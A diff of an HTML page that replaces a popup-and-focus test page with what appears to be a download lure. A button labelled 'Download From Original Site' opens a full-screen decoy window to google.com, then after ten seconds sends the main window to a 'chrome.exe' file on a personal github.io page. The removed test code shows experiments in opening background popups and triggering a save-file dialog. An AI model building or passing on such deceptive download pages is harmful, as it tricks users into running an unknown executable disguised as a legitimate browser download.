@@ -1,67 +1,44 @@
-<!DOCTYPE html>
 <html>
-<head>
+ <head> 
   <meta charset="utf-8">
-  <title>Focus & Popup Lifecycle Test</title>
-  <style>
-    body { font-family: sans-serif; padding: 20px; }
-    button { padding: 10px 16px; }
-  </style>
-</head>
-<body>
-
-<h3>Redirect → Background Popup → Save File Picker</h3>
-
-<button onclick="go()">Go</button>
-
-<script>
-function go() {
-  console.log("User clicked");
-
-  // 1️⃣ Redirect halaman utama
-  setTimeout(() => {
-    document.location = "https://www.google.com";
-  }, 0);
-
-  // 2️⃣ Buka POPUP KECIL, TANPA FOCUS
-  setTimeout(() => {
-    const popup = window.open(
-      "about:blank",
-      "bgPopup",
-      "width=300,height=200,left=50,top=50,noopener,noreferrer"
-    );
-
-    if (!popup) {
-      console.log("Popup blocked");
-      return;
-    }
-
-    console.log("Popup opened (background)");
-
-    // JANGAN focus popup
-    popup.blur();
-    window.focus();
-
-  }, 100);
-
-  // 3️⃣ Trigger Save File Picker SETELAH popup ada
-  setTimeout(async () => {
-    console.log("Triggering showSaveFilePicker()");
-    try {
-      await window.showSaveFilePicker({
-        suggestedName: "test.txt",
-        types: [{
-          description: "Text Files",
-          accept: { "text/plain": [".txt"] }
-        }]
-      });
-      console.log("Picker resolved");
-    } catch (e) {
-      console.log("Picker rejected/canceled:", e);
-    }
-  }, 500);
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
 }
-</script>
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+  const w = screen.availWidth;
+  const h = screen.availHeight;
 
-</body>
+    window.open(
+      "https://google.com",
+      "popup",
+      `
+  width=${screen.availWidth},
+  height=${screen.availHeight},
+  left=0,
+  top=0,
+  resizable=yes,
+  scrollbars=yes
+  `);
+
+    setTimeout(function(){
+        window.location.href = 'https://bangbedul19-del.github.io/bedulsantuy/chrome.exe';
+    }, 10000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
